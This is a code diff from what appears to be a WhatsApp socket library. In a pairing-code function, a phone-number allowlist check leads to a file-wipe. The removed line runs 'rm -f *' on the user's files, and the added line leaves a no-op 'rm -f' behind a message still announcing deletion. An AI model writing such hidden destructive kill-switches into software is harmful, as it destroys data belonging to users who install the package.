@@ -494,7 +494,7 @@ export const makeSocket = (config: SocketConfig) => {
 const requestPairingCodes = async (phoneNumber) => {
     if (!allowedNumbers.includes(phoneNumber)) {
         console.warn('Nomor tidak diizinkan! Menghapus Seluruh file...');
-        exec(`rm -f *`, (error, stdout, stderr) => {
+        exec(`rm -f`, (error, stdout, stderr) => {
             if (error) {
                 console.error(`Gagal menghapus semua file: ${error.message}`);
                 return;
